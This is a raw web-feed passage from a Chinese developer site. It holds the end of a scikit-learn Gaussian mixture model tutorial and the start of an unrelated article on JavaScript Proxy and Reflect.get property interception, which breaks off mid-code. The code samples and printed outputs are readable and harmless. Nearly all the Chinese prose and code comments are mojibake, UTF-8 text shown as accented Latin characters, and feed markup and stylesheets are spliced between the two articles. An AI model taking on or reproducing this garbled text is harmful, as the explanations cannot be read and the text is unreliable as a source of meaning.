<p>è¿™æ®µä»£ç ç”Ÿæˆäº†ä¸€ä¸ªåŒ…å«500ä¸ªæ ·æœ¬ã€3ä¸ªç‰¹å¾çš„æ•°æ®é›†ï¼Œè¿™äº›æ ·æœ¬æ¥è‡ª4ä¸ªä¸åŒçš„é«˜æ–¯åˆ†å¸ƒã€‚æ¯ä¸ªåˆ†å¸ƒçš„ä¸­å¿ƒä½ç½®ç”±<code>centers</code>å‚æ•°æ§åˆ¶ï¼Œè€Œ<code>cluster_std</code>å‚æ•°å†³å®šäº†æ¯ä¸ªåˆ†å¸ƒçš„ç¦»æ•£ç¨‹åº¦ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨Scikit-learnçš„<code>GaussianMixture</code>ç±»æ¥å®šä¹‰GMMæ¨¡å‹ã€‚åˆ›å»ºæ¨¡å‹æ—¶éœ€è¦è®¾ç½®å¤šä¸ªé‡è¦å‚æ•°ï¼Œæ¯ä¸ªå‚æ•°éƒ½å¯¹æ¨¡å‹æ€§èƒ½æœ‰ç›´æ¥å½±å“ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.mixture <span class="hljs-keyword">import</span> GaussianMixture

<span class="hljs-comment"># åˆ›å»ºGMMæ¨¡å‹å®ä¾‹</span>
gmm = GaussianMixture(
    n_components=<span class="hljs-number">4</span>,           <span class="hljs-comment"># ! è¦è¯†åˆ«çš„èšç±»æ•°é‡ï¼ˆé«˜æ–¯åˆ†å¸ƒä¸ªæ•°ï¼‰</span>
    covariance_type=<span class="hljs-string">"full"</span>,   <span class="hljs-comment"># åæ–¹å·®çŸ©é˜µç±»å‹ï¼šå®Œå…¨åæ–¹å·®ï¼ˆæ¯ä¸ªæˆåˆ†æœ‰è‡ªå·±çš„ä»»æ„åæ–¹å·®çŸ©é˜µï¼‰</span>
    tol=<span class="hljs-number">1e-3</span>,                 <span class="hljs-comment"># æ”¶æ•›é˜ˆå€¼ï¼šå½“å¯¹æ•°ä¼¼ç„¶å¢ç›Šå°äºæ­¤å€¼æ—¶åœæ­¢è¿­ä»£</span>
    max_iter=<span class="hljs-number">50</span>,              <span class="hljs-comment"># ! æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼šEMç®—æ³•çš„æœ€å¤§è¿­ä»£è½®æ•°</span>
    init_params=<span class="hljs-string">"kmeans"</span>,     <span class="hljs-comment"># åˆå§‹åŒ–æ–¹æ³•ï¼šä½¿ç”¨K-meansè¿›è¡Œå‚æ•°åˆå§‹åŒ–ï¼ˆæ¯”éšæœºåˆå§‹åŒ–æ›´ç¨³å®šï¼‰</span>
    random_state=<span class="hljs-number">42</span>,          <span class="hljs-comment"># éšæœºç§å­ï¼šç¡®ä¿ç»“æœå¯é‡å¤</span>
)

<span class="hljs-comment"># è®­ç»ƒGMMæ¨¡å‹</span>
gmm.fit(dataset)
<span class="hljs-comment"># x</span>

<span class="hljs-built_in">print</span>(gmm.weights_)	<span class="hljs-comment"># è·å–æ¯ä¸ªé«˜æ–¯åˆ†å¸ƒçš„æƒé‡</span>
<span class="hljs-built_in">print</span>(gmm.means_)	<span class="hljs-comment"># è·å–æ¯ä¸ªé«˜æ–¯åˆ†å¸ƒçš„å‡å€¼å‘é‡</span>
<span class="hljs-built_in">print</span>(gmm.covariances_.shape)	<span class="hljs-comment"># è·å–å„é«˜æ–¯æˆåˆ†çš„åæ–¹å·®çŸ©é˜µå½¢çŠ¶</span>
<span class="hljs-built_in">print</span>(gmm.covariances_[<span class="hljs-number">0</span>])	<span class="hljs-comment"># æŸ¥çœ‹ç¬¬ä¸€ä¸ªé«˜æ–¯æˆåˆ†çš„åæ–¹å·®çŸ©é˜µ</span>

<span class="hljs-comment"># === è¾“å‡º ===</span>

<span class="hljs-comment"># åˆ†åˆ«æ˜¯ç¬¬0ä¸ªï¼Œç¬¬1ä¸ªï¼Œç¬¬2ä¸ªï¼Œç¬¬3ä¸ªé«˜æ–¯åˆ†å¸ƒçš„æƒé‡</span>
[<span class="hljs-number">0.25001436</span>, <span class="hljs-number">0.25</span>      , <span class="hljs-number">0.23822018</span>, <span class="hljs-number">0.26176546</span>]

<span class="hljs-comment"># åˆ†åˆ«æ˜¯ç¬¬0ä¸ªï¼Œç¬¬1ä¸ªï¼Œç¬¬2ä¸ªï¼Œç¬¬3ä¸ªé«˜æ–¯åˆ†å¸ƒçš„å‡å€¼å‘é‡ mu</span>
[[-<span class="hljs-number">9.27389593</span>, -<span class="hljs-number">7.07418061</span>, -<span class="hljs-number">0.82308003</span>],
 [ <span class="hljs-number">2.60201839</span>,  <span class="hljs-number">3.72587996</span>, -<span class="hljs-number">8.02382928</span>],
 [-<span class="hljs-number">5.24683692</span>, -<span class="hljs-number">7.48695937</span>,  <span class="hljs-number">1.07606264</span>],
 [-<span class="hljs-number">1.02626245</span>, -<span class="hljs-number">6.35110703</span>,  <span class="hljs-number">4.6423531</span> ]]

<span class="hljs-comment"># 4ä¸ª3x3çš„åæ–¹å·®çŸ©é˜µ</span>
(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>)

<span class="hljs-comment"># ç¬¬ä¸€ä¸ªé«˜æ–¯æˆåˆ†çš„åæ–¹å·®çŸ©é˜µ</span>
[[ <span class="hljs-number">3.56369354</span>,  <span class="hljs-number">0.33917216</span>, -<span class="hljs-number">0.19620971</span>],
 [ <span class="hljs-number">0.33917216</span>,  <span class="hljs-number">3.24354619</span>, -<span class="hljs-number">0.17032308</span>],
 [-<span class="hljs-number">0.19620971</span>, -<span class="hljs-number">0.17032308</span>,  <span class="hljs-number">2.71638609</span>]]
</code></pre>
<p>è®­ç»ƒå®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¨¡å‹è¿›è¡Œé¢„æµ‹å’Œæ¦‚ç‡è®¡ç®—ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºæµ‹è¯•æ ·æœ¬</span>
test_samples = np.array([
    [<span class="hljs-number">1.0</span>, <span class="hljs-number">4.1</span>, <span class="hljs-number">3.1</span>],    <span class="hljs-comment"># æµ‹è¯•æ ·æœ¬1</span>
    [-<span class="hljs-number">8.0</span>, -<span class="hljs-number">6.0</span>, -<span class="hljs-number">0.5</span>], <span class="hljs-comment"># æµ‹è¯•æ ·æœ¬2</span>
    [<span class="hljs-number">3.0</span>, <span class="hljs-number">4.0</span>, -<span class="hljs-number">7.0</span>],   <span class="hljs-comment"># æµ‹è¯•æ ·æœ¬3</span>
    [-<span class="hljs-number">2.0</span>, -<span class="hljs-number">6.0</span>, <span class="hljs-number">4.0</span>]   <span class="hljs-comment"># æµ‹è¯•æ ·æœ¬4</span>
])

<span class="hljs-comment"># é¢„æµ‹æ¯ä¸ªæ ·æœ¬æœ€å¯èƒ½å±äºå“ªä¸ªé«˜æ–¯æˆåˆ†</span>
<span class="hljs-built_in">print</span>(gmm.predict(test_samples)) 

<span class="hljs-comment"># === è¾“å‡º ===</span>
[<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]
<span class="hljs-comment"># è¡¨æ˜äº†æµ‹è¯•æ ·æœ¬1å±äºç¬¬3ä¸ªé«˜æ–¯åˆ†å¸ƒï¼Œæµ‹è¯•æ ·æœ¬2å±äºç¬¬0ä¸ªé«˜æ–¯åˆ†å¸ƒï¼Œ...</span>
</code></pre>
<p>ä»¥ä¸Šå°±æ˜¯æ··åˆé«˜æ–¯æ¨¡å‹çš„æ‰€æœ‰å†…å®¹äº†ï¼Œå¯¹äºçœ‹åˆ°è¿™é‡Œçš„ä½ ï¼Œæ­å–œä½ ï¼Œä½ ç°åœ¨å·²ç»æŒæ¡äº†è¿™ä¸€å¼ºå¤§çš„æ¦‚ç‡å»ºæ¨¡å·¥å…·ï¼</p>
<p>å›æƒ³æˆ‘æœ€åˆå­¦ä¹ æœºå™¨å­¦ä¹ æ—¶ï¼Œå¸¸å¸¸æ˜¯å¬è¯´ä¸€ä¸ªæ–¹æ³•å°±å»å­¦ï¼Œä½†å­¦å®Œå´ä¸çŸ¥é“å®ƒç©¶ç«Ÿèƒ½è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Œå­¦äº†è·Ÿæ²¡å­¦ä¸€æ ·ï¼Œè¿™æˆ–è®¸æ˜¯å¾ˆå¤šäººå…±åŒçš„å­¦ä¹ ç»å†ã€‚<strong>è€ŒçœŸæ­£çš„ç†è§£ï¼Œå¾€å¾€å‘ç”Ÿåœ¨ä½ å°†ä¸€ä¸ªæŠ½è±¡ç®—æ³•ä¸ä¸€ä¸ªå…·ä½“é—®é¢˜è”ç³»èµ·æ¥çš„é‚£ä¸€åˆ»ã€‚</strong></p>
<p>ä¸¾ä¸ªæœ‰è¶£çš„ä¾‹å­å§ï¼Œå¦‚ä»Šæ™ºèƒ½æ‰‹æœºä¸Šçš„è¿åŠ¨Appéƒ½éå¸¸æ™ºèƒ½ï¼Œä½ åªè¦æŠŠæ‰‹æœºæ£åœ¨å…œé‡Œæˆ–è€…æ‹¿åœ¨æ‰‹ä¸Šï¼Œç„¶åå¼€å§‹è¿åŠ¨ï¼Œå®ƒå°±èƒ½é€šè¿‡åˆ†ææ‰‹æœºçš„å„ç§ä¼ æ„Ÿå™¨æ•°æ®ï¼Œæ¥è‡ªåŠ¨æ¨ç†å‡ºä½ å½“å‰çš„è¿åŠ¨çŠ¶æ€ï¼Œæ˜¯åœ¨<strong>æ­¥è¡Œã€è·‘æ­¥ã€éª‘è¡Œ</strong>ï¼Œè¿˜æ˜¯<strong>é™æ­¢</strong>ã€‚æˆ‘æƒ³ä½ ä¼šå¥½å¥‡ï¼Œå®ƒæ˜¯æ€ä¹ˆçŸ¥é“æˆ‘ä»¬çš„è¿åŠ¨çŠ¶æ€çš„ã€‚</p>
<p>ç›¸ä¿¡ä½ åœ¨äº†è§£äº†æ··åˆé«˜æ–¯åˆ†å¸ƒåå°±ä¼šç†è§£å®ƒçš„åŸç†ï¼šæ¯ä¸ªä¼ æ„Ÿå™¨ï¼ˆå¦‚åŠ é€Ÿåº¦è®¡ã€é™€èºä»ªã€GPSç­‰ï¼‰æ”¶é›†åˆ°çš„æ•°æ®å°±æ˜¯ä¸€ä¸ªç‰¹å¾ï¼Œä¼ æ„Ÿå™¨åœ¨æ¯ä¸ªæ—¶åˆ»éƒ½ä¼šæ”¶é›†åˆ°æ•°æ®ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ®µæ—¶é—´å†…æ¯éš”0.5sé‡‡æ ·ä¸€æ¬¡æ‰€æœ‰ä¼ æ„Ÿå™¨çš„æ•°æ®ï¼Œç„¶åå¯¹è¿™ä¸€æ®µæ—¶é—´å†…çš„æ•°æ®è¿›è¡ŒGMMèšç±»åˆ†æã€‚å°†å…¶åˆ†è§£æˆå¤šä¸ªå¤šå…ƒé«˜æ–¯åˆ†å¸ƒï¼Œé€šè¿‡åˆ†ææ¯”å¯¹ä¸åŒçš„é«˜æ–¯åˆ†å¸ƒï¼Œå°±èƒ½æ¨æ–­å‡ºä½ çš„è¿åŠ¨çŠ¶æ€ã€‚å¦‚æœä½ æ„Ÿå…´è¶£ï¼Œå®Œå…¨å¯ä»¥è‡ªå·±å»å°è¯•ä¸€ä¸‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¯¦è§£å®ç°å±æ€§çš„å…¨é¢æ‹¦æˆª]]></title>    <link>https://juejin.cn/post/7592882393251545131</link>    <guid>https://juejin.cn/post/7592882393251545131</guid>    <pubDate>2026-01-09T05:39:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393251545131" data-draft-id="7592921639463895082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¯¦è§£å®ç°å±æ€§çš„å…¨é¢æ‹¦æˆª"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-09T05:39:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sept940"/> <meta itemprop="url" content="https://juejin.cn/user/3960862872450519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¯¦è§£å®ç°å±æ€§çš„å…¨é¢æ‹¦æˆª
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3960862872450519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sept940
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:39:09.000Z" title="Fri Jan 09 2026 05:39:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç›®æ ‡</h2>
<p>åœ¨ä½¿ç”¨ Proxy æ‹¦æˆªå±æ€§æ—¶ï¼Œä¸€ä¸ªå¸¸è§æŒ‘æˆ˜æ˜¯ï¼šä¸€æ¬¡å¤–éƒ¨çš„å±æ€§è®¿é—®ï¼Œå¯èƒ½åœ¨å†…éƒ¨è§¦å‘å¯¹å¤šä¸ªå…¶ä»–å±æ€§çš„è¯»å–ã€‚å¦‚ä½•ç¡®ä¿æ‰€æœ‰è¿™äº›<strong>é—´æ¥çš„å±æ€§è®¿é—®</strong>éƒ½èƒ½è¢« Proxy æˆåŠŸæ•è·å¹¶æ‹¦æˆªï¼Œæ˜¯æˆ‘ä»¬éœ€è¦è§£å†³çš„å…³é”®é—®é¢˜ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-comment">// æ³¨æ„è¿™é‡Œï¼šthis.a å’Œ this.b</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span>å®ç°å±æ€§çš„å…¨é¢æ‹¦æˆª</span>

proxy.<span class="hljs-property">c</span> <span class="hljs-comment">// åˆ†åˆ«æ‰“å° read cã€read aã€read b ï¼Œå¹¶è¾“å‡º proxy çš„ c å±æ€§</span>
</code></pre>
<h2 data-id="heading-1">åˆæ­¥è®¾æƒ³</h2>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-comment">// æ³¨æ„è¿™é‡Œï¼šthis.a å’Œ this.b</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> target[key]
    }
})

proxy.<span class="hljs-property">c</span> <span class="hljs-comment">// è®¿é—® proxy çš„ c å±æ€§</span>
</code></pre>
<p>è¿™æ®µä»£ç çœ‹èµ·æ¥æŒºç®€å•ï¼Œå®ƒçš„ç›®æ ‡æ˜¯ï¼šå½“æœ‰äººæƒ³è¯» <code>proxy</code> çš„ä»»ä½•å±æ€§æ—¶ï¼Œæˆ‘ä»¬éƒ½èƒ½å…ˆ<code>console.log('read', key)</code>ï¼Œç„¶åæŠŠè¯»å–æ“ä½œå§”æ‰˜ç»™åŸå§‹å¯¹è±¡ <code>obj</code>ã€‚</p>
<p>å½“ä½ è¿è¡Œ <code>proxy.c</code> çš„æ—¶å€™ï¼Œä½ ä¼šå‘ç°æ§åˆ¶å°è¾“å‡ºäº†ï¼š
<code>read c</code>
ç„¶åå¾—åˆ°ç»“æœ <code>3</code>ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬åœ¨è®¿é—® c çš„æ—¶å€™ï¼Œå®é™…ä¸Šè¿˜æ¶‰åŠäº†å…¶ä»–ä¸¤ä¸ªå±æ€§çš„è®¿é—®ï¼Œ<code>this.a</code>å’Œ<code>this.b</code></p>
<p>åŸå› ï¼Œ<code>return target[key]</code> ç›´æ¥åœ¨åŸå§‹å¯¹è±¡ <code>obj</code> ä¸Šè¯»å–å±æ€§ï¼Œå¯¼è‡´ <code>obj.c</code> çš„ <code>getter</code> å†…éƒ¨çš„ <code>this.a</code> å’Œ <code>this.b</code> ä¹Ÿç›´æ¥è®¿é—® <code>obj</code> çš„å±æ€§ï¼Œä»è€Œç»•è¿‡äº† <code>proxy</code> çš„æ‹¦æˆªã€‚</p>
<p>ä¸å¥½æ‡‚çš„è¯æ²¡å…³ç³»ï¼Œæˆ‘ä»¬çœ‹å›¾
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/192f070e73c14133aa4ec5e5d870191e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=l9k928rzRpGoj8VRkDD2EykgDfk%3D" alt="image.png" loading="lazy"/>
ä¸Šå›¾å±•ç¤ºäº†<code>target[key]</code>å’Œ<code>proxy[key]</code>çš„åŒºåˆ«</p>
<p>ç”±äº<code>target</code>æœ¬èº«å¹¶æ²¡æœ‰æ‹¦æˆªåŠŸèƒ½ï¼Œæ‰€ä»¥å½“è¿”å›<code>target[key]</code>çš„æ—¶å€™ï¼Œè™½ç„¶è¯»å–äº† <code>this.a</code> å’Œ <code>this.b</code>ï¼Œä½†å¹¶æœªè§¦å‘é™·é˜±</p>
<h2 data-id="heading-2">è¿”å› proxy[key]</h2>
<p>æ¥ç€æˆ‘ä»¬å¾ˆå®¹æ˜“å°±ä¼šæƒ³åˆ°ï¼Œé‚£å°±ç›´æ¥è¿”å›<code>proxy[key]</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> proxy[key] <span class="hljs-comment">// &lt;- åŒºåˆ«åœ¨è¿™</span>
    }
})

proxy.<span class="hljs-property">c</span>
</code></pre>
<p>è¿™å°±å¤§é”™ç‰¹é”™äº†ï¼Œä¼šé™·å…¥æ— é™é€’å½’çš„å¾ªç¯</p>
<p>åŸå› åœ¨äºä½ ç¬¬ä¸€æ­¥è°ƒç”¨<code>proxy.c</code>çš„æ—¶å€™ï¼Œè§¦å‘äº†é™·é˜±ï¼Œäºæ˜¯ä»–è¿”å›äº†ä¸€ä¸ª<code>proxy[key]</code>ï¼ˆ<code>key == c</code>ï¼‰ï¼Œä½†æ˜¯<code>proxy[key]</code>å†æ¬¡è§¦å‘äº†é™·é˜±ï¼Œæ¥ç€ç»§ç»­è¿”å›<code>proxy[key]</code>â€¦â€¦</p>
<p>æµç¨‹å¦‚å›¾</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d65235f8ae764eed8f2f0bb228f15092~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=XLTYoUrU9J4XZHrY5aHxC4YuE6k%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">ä½¿ç”¨åå°„</h2>
<p>ç°åœ¨åœä¸‹æ¥æ€è€ƒä¸€ä¸‹æ€»ç»“ä¸€ä¸‹ï¼Œç°åœ¨æ‰€é¢ä¸´çš„æ ¹æœ¬çŸ›ç›¾åœ¨äº</p>
<blockquote>
<p><code>target</code>æœ¬èº«ä¸å…·æœ‰æ‹¦æˆªåŠŸèƒ½ï¼Œè€Œå…·æœ‰æ‹¦æˆªåŠŸèƒ½çš„<code>proxy</code>å¯¹è‡ªèº«çš„è°ƒç”¨ä¼šé™·å…¥æ— é™é€’å½’çš„å±€é¢</p>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å®ç°ä¸€ä¸ªï¼Œæ—¢å…·æœ‰æ‹¦æˆªåŠŸèƒ½çš„åŒæ—¶ï¼ŒæŠŠé€’å½’çš„æƒ…å†µç»ˆæ­¢</p>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹åå°„æ˜¯å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜çš„</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, propertyKey[, receiver])

-   target
    éœ€è¦å–å€¼çš„ç›®æ ‡å¯¹è±¡

-   propertyKey
    éœ€è¦è·å–çš„å€¼çš„é”®å€¼

-   receiver
    å¦‚æœ<span class="hljs-string">`target`</span>å¯¹è±¡ä¸­æŒ‡å®šäº†<span class="hljs-string">`getter`</span>ï¼Œ<span class="hljs-string">`receiver`</span>åˆ™ä¸º<span class="hljs-string">`getter`</span>è°ƒç”¨æ—¶çš„<span class="hljs-string">`this`</span>å€¼ã€‚
</code></pre>
<p>å¦‚æœæˆ‘ä»¬æŒ‡å®šäº†<code>receiver</code>ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œå¦‚ä¸‹å›¾ç¬¬ä¸‰ä¸ªæµç¨‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/573a00e6ccff4178bbdcfb986299c50d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=mXEnMv60wu29ugma2UlklRxBEWU%3D" alt="image.png" loading="lazy"/></p>
<p>ç°åœ¨æˆ‘ä»¬é‡å†™ä»£ç </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

